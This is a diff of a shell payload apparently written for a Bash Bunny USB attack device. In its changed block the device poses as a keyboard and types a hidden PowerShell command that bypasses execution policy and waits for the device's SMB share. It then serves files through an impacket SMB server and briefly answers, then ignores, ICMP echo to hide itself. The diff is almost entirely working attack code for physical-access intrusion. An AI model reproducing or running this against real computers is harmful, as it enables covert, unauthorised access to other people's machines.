@@ -96,35 +96,37 @@ do
 	# SMB server was started
 	if	[ -f "LAUNCHER_SMB" ]
 	then
-		LED C
 		if [ -d "/tools/impacket" ]
 		then
 			if [ $SMB_LAUNCHED = $false ]
 			then
-				LED C FAST
+				LED C
 				$SMB_LAUNCHED = $true
+				echo "+ Launching file browser to SMB server.." >> $LOG_FILE
+				# Just wanna start powershell real quick..(sets up a loop to wait for the Bunny to get ready, then starts Windows Explorer - pointed at the SMB server)
+				ATTACKMODE HID
+				RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"while (\$true) { If ((New-Object net.sockets.tcpclient ($HOST_IP,445)).Connected) { ii \\\\$HOST_IP\\s; exit }\""
+				# Okay, back to business..
+				ATTACKMODE RNDIS_ETHERNET
+				echo "+ Setting up SMB environment.." >> $LOG_FILE
+				udisk mount
 				echo "+ Attempting to launch SMB.." >> $LOG_FILE
-				python /tools/impacket/examples/smbserver.py -comment "Who needs a locker when you have a server?" s "$PAYLOAD_DIR/ww/" >> $SMB_FILE &
-				echo "+ SMB server started.." >> $LOG_FILE
+				python /tools/impacket/examples/smbserver.py -comment "Who needs a locker when you have a server?" s $PAYLOAD_DIR/ww &
+				echo "+ SMB server started" >> $LOG_FILE
+				sleep 4
+				# Trip the powershell loop (suddenly we can see the Bunny!)
+				echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
+				sleep 2
+				# Hide, Bunny, hide!
+				echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all
+				echo "+ Waiting for commands.." >> $LOG_FILE
+				LED C SLOW
 			fi
-			echo "+ Launching file browser to SMB server.." >> $LOG_FILE
-			# Just wanna start powershell real quick..(sets up a loop to wait for the Bunny to get ready, then starts Windows Explorer - pointed at the SMB server)
-			ATTACKMODE HID
-			RUN WIN "powershell -windowstyle hidden -exec Bypass \"while (\$true) { If ((New-Object net.sockets.tcpclient ($HOST_IP,445)).Connected) { ii \\\\$HOST_IP\\s; exit } }\""
-			sleep 2
-			# Okay, back to business..
-			ATTACKMODE RNDIS_ETHERNET
-			# Trip the powershell loop (suddenly we can see the Bunny!)
-			echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
-			sleep 1
-			# Aww, it's gone again..
-			echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all
-			echo "+ Waiting for commands.." >> $LOG_FILE
 		else
 			LED FAIL1
+			sleep 2
+			LED B SLOW
 		fi
-		sleep 2
-		LED C SLOW
 		rm "LAUNCHER_SMB"
 	fi
 	sleep 1
